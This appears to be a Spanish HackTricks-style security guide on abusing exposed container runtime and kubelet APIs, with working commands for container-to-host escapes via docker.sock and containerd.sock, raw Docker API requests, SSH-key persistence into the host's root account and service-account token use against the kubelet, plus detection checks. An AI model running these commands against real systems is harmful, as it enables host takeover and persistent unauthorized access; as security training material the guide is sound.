# Exposición de la API de Runtime y del Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

Muchas de las intrusiones reales en contenedores no comienzan con un escape de namespace. Comienzan con acceso al plano de control del runtime. Si una workload puede comunicarse con `dockerd`, `containerd`, CRI-O, Podman o kubelet mediante un socket Unix montado o un listener TCP expuesto, el atacante puede solicitar un nuevo contenedor con mejores privilegios, montar el filesystem del host, unirse a los namespaces del host o recuperar información sensible del nodo. En esos casos, la API del runtime es el límite de seguridad real, y comprometerla es, en la práctica, casi equivalente a comprometer el host.

Por este motivo, la exposición del socket del runtime debe documentarse por separado de las protecciones del kernel. Un contenedor con seccomp, capabilities y confinamiento MAC normales todavía puede estar a una llamada de API de comprometer el host si `/var/run/docker.sock` o `/run/containerd/containerd.sock` están montados en su interior. El aislamiento del kernel del contenedor actual puede estar funcionando exactamente como se diseñó, mientras el plano de gestión del runtime permanece completamente expuesto.

## Modelos de acceso al Daemon

Docker Engine expone tradicionalmente su API privilegiada a través del socket Unix local en `unix:///var/run/docker.sock`. Históricamente, también se ha expuesto de forma remota mediante listeners TCP como `tcp://0.0.0.0:2375` o un listener protegido con TLS en `2376`. Exponer el daemon de forma remota sin TLS sólido ni autenticación de cliente convierte efectivamente la API de Docker en una interfaz root remota.

containerd, CRI-O, Podman y kubelet exponen superficies de alto impacto similares. Los nombres y los workflows difieren, pero la lógica no. Si la interfaz permite al caller crear workloads, montar paths del host, recuperar credenciales o modificar contenedores en ejecución, la interfaz es un canal de gestión privilegiado y debe tratarse como tal.

Las rutas locales comunes que conviene comprobar son:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Las stacks más antiguas o especializadas también pueden exponer endpoints como `dockershim.sock`, `frakti.sock` o `rktlet.sock`. Son menos comunes en entornos modernos, pero cuando se encuentran deben tratarse con la misma cautela, ya que representan superficies de control del runtime en lugar de sockets de aplicación ordinarios.

## Acceso remoto seguro

Si un daemon debe exponerse más allá del socket local, la conexión debe protegerse con TLS y, preferiblemente, mediante autenticación mutua, de modo que el daemon verifique al cliente y el cliente verifique al daemon. La antigua práctica de abrir el daemon de Docker mediante HTTP sin cifrado por comodidad es uno de los errores más peligrosos en la administración de containers, porque la superficie de la API es lo bastante potente como para crear directamente containers con privilegios.

El patrón histórico de configuración de Docker era el siguiente:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
En hosts basados en systemd, la comunicación con el daemon también puede aparecer como `fd://`, lo que significa que el proceso hereda un socket preabierto de systemd en lugar de enlazarlo directamente. La lección importante no es la sintaxis exacta, sino la consecuencia de seguridad. En el momento en que el daemon escucha más allá de un socket local con permisos estrictamente restringidos, la seguridad del transporte y la autenticación del cliente pasan a ser obligatorias en lugar de medidas de hardening opcionales.

## Abuse

Si hay un socket de runtime, confirma cuál es, si existe un cliente compatible y si es posible acceder mediante HTTP sin procesar o gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Estos comandos son útiles porque distinguen entre una ruta inexistente, un socket montado pero inaccesible y una API privilegiada activa. Si el cliente funciona correctamente, la siguiente pregunta es si la API puede iniciar un nuevo container con un bind mount del host o compartiendo namespaces del host.

### Cuando No Hay Ningún Cliente Instalado

La ausencia de `docker`, `podman` u otra CLI sencilla no significa que el socket sea seguro. Docker Engine se comunica mediante HTTP a través de su Unix socket, y Podman expone tanto una API compatible con Docker como una API nativa de Libpod mediante `podman system service`. Esto significa que un entorno mínimo que solo tenga `curl` aún puede ser suficiente para controlar el daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Esto es importante durante el post-exploitation porque los defensores a veces eliminan los binarios de cliente habituales, pero dejan montado el management socket. En hosts de Podman, recuerda que la ruta de alto valor difiere entre los despliegues rootful y rootless: `unix:///run/podman/podman.sock` para instancias de servicio rootful y `unix://$XDG_RUNTIME_DIR/podman/podman.sock` para las rootless.

### Ejemplo completo: Docker Socket hacia el root del host

Si `docker.sock` es accesible, el escape clásico consiste en iniciar un contenedor nuevo que monte el sistema de archivos root del host y, a continuación, ejecutar `chroot` en él:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Esto proporciona ejecución directa como root del host a través del Docker daemon. El impacto no se limita a la lectura de archivos. Una vez dentro del nuevo container, el atacante puede modificar archivos del host, recolectar credenciales, implantar persistencia o iniciar cargas de trabajo adicionales con privilegios.

### Ejemplo completo: Docker Socket To Host Namespaces

Si el atacante prefiere entrar en los namespaces en lugar de obtener acceso únicamente al filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Esta ruta llega al host solicitando al runtime que cree un nuevo container con una exposición explícita del host namespace, en lugar de explotar el actual.

### Docker Socket Persistence Pattern

El control del runtime también puede utilizarse para la persistencia en lugar de para obtener un shell de una sola ejecución. El patrón genérico consiste en crear un container auxiliar con un montaje del host, escribir material de acceso autorizado o un hook de inicio en el sistema de archivos montado del host y, después, validar que el host lo utilice.

Forma de ejemplo:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
La misma idea puede dirigirse a unidades de systemd, fragmentos de cron, archivos de inicio de aplicaciones o claves SSH, según lo que el operador quiera demostrar. El punto importante es que el cambio persistente se realiza mediante la autoridad del sistema de archivos del host del runtime daemon, no mediante privilegios adicionales en el contenedor original.

### Pivot de Helper mediante la Raw Docker API

Cuando falta la CLI de Docker, el mismo flujo de helper con host-mount puede ejecutarse mediante HTTP sobre el Unix socket. El flujo genérico es: confirmar la API, crear un contenedor helper con un bind mount del host, iniciarlo, crear una instancia de exec e iniciar ese exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
La solicitud final `/exec/<id>/start` depende del ID de exec devuelto, pero el punto de seguridad es independiente de la lógica JSON exacta: el acceso directo a la API de un daemon de Docker rootful es suficiente para solicitar un workload auxiliar con mayores privilegios.

### Ejemplo completo: socket de containerd

Un socket de `containerd` montado suele ser igual de peligroso:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Si está disponible un cliente más similar a Docker, `nerdctl` puede ser más práctico que `ctr` porque expone flags conocidos como `--privileged`, `--pid=host` y `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
El impacto vuelve a ser el compromiso del host. Aunque no haya herramientas específicas de Docker, otra runtime API todavía puede ofrecer el mismo poder administrativo. En los nodos de Kubernetes, `crictl` también puede ser suficiente para el reconocimiento y la interacción con contenedores, porque se comunica directamente con el endpoint CRI.

### BuildKit Socket

`buildkitd` es fácil de pasar por alto porque a menudo se considera "solo el backend de build", pero el daemon sigue siendo un plano de control privilegiado. Un `buildkitd.sock` accesible puede permitir a un atacante ejecutar pasos de build arbitrarios, inspeccionar las capacidades del worker, usar contextos locales del entorno comprometido y solicitar entitlements peligrosos, como `network.host` o `security.insecure`, cuando el daemon está configurado para permitirlos.

Las primeras interacciones útiles son:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Si el daemon acepta solicitudes de build, comprueba si hay entitlements inseguros disponibles:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
El impacto exacto depende de la configuración del daemon, pero un servicio BuildKit rootful con entitlements permisivos no es una comodidad inocua para desarrolladores. Trátalo como otra superficie administrativa de alto valor, especialmente en runners de CI y nodos de build compartidos.

### API de Kubelet sobre TCP

El kubelet no es un container runtime, pero sigue formando parte del plano de gestión del nodo y a menudo se incluye en el mismo análisis del límite de confianza. Si el puerto seguro `10250` del kubelet es accesible desde el workload, o si se exponen credenciales del nodo, kubeconfigs o permisos de proxy, el atacante podría enumerar Pods, recuperar logs o ejecutar comandos en contenedores locales al nodo sin tocar en ningún momento la ruta de admission del servidor de API de Kubernetes.

Empieza con un descubrimiento sencillo:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Si la ruta de proxy del kubelet o del API-server autoriza `exec`, un cliente compatible con WebSocket puede convertirlo en ejecución de código en otros contenedores del nodo. Esta es también la razón por la que `nodes/proxy` con solo permisos `get` es más peligroso de lo que parece: la solicitud aún puede llegar a endpoints del kubelet que ejecutan comandos, y esas interacciones directas con el kubelet no aparecen en los registros de auditoría normales de Kubernetes.<sup>[[2]](#references)</sup>

## Comprobaciones

El objetivo de estas comprobaciones es determinar si el contenedor puede alcanzar algún plano de gestión que debería haber permanecido fuera del límite de confianza.
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Qué es interesante aquí:

- Un runtime socket montado suele ser una primitiva administrativa directa, no una simple divulgación de información.
- Un listener TCP en `2375` sin TLS debe tratarse como una condición de compromiso remoto.
- Las variables de entorno como `DOCKER_HOST` suelen revelar que el workload fue diseñado intencionadamente para comunicarse con el runtime del host.

## Valores predeterminados del runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | Unix socket local de forma predeterminada | `dockerd` escucha en el socket local y el daemon normalmente se ejecuta como root | montar `/var/run/docker.sock`, exponer `tcp://...:2375`, TLS débil o ausente en `2376` |
| Podman | CLI daemonless de forma predeterminada | No se requiere un daemon privilegiado de larga duración para el uso local normal; los API sockets aún pueden exponerse cuando se habilita `podman system service` | exponer `podman.sock`, ejecutar el servicio de forma amplia, uso de una API rootful |
| containerd | Socket local privilegiado | La API administrativa se expone a través del socket local y normalmente la consumen herramientas de nivel superior | montar `containerd.sock`, acceso amplio a `ctr` o `nerdctl`, exponer namespaces privilegiados |
| CRI-O | Socket local privilegiado | El endpoint CRI está diseñado para componentes confiables locales al nodo | montar `crio.sock`, exponer el endpoint CRI a workloads no confiables |
| Kubernetes kubelet | API de gestión local al nodo | Kubelet no debería ser accesible ampliamente desde los Pods; el acceso puede exponer el estado de los Pods, credenciales y funciones de ejecución, según la autenticación y autorización | montar sockets o certificados de kubelet, autenticación débil de kubelet, host networking junto con un endpoint de kubelet accesible |

## References

- [1] [explotación del socket de containerd, parte 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Riesgos de bypass del Kubernetes API Server](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
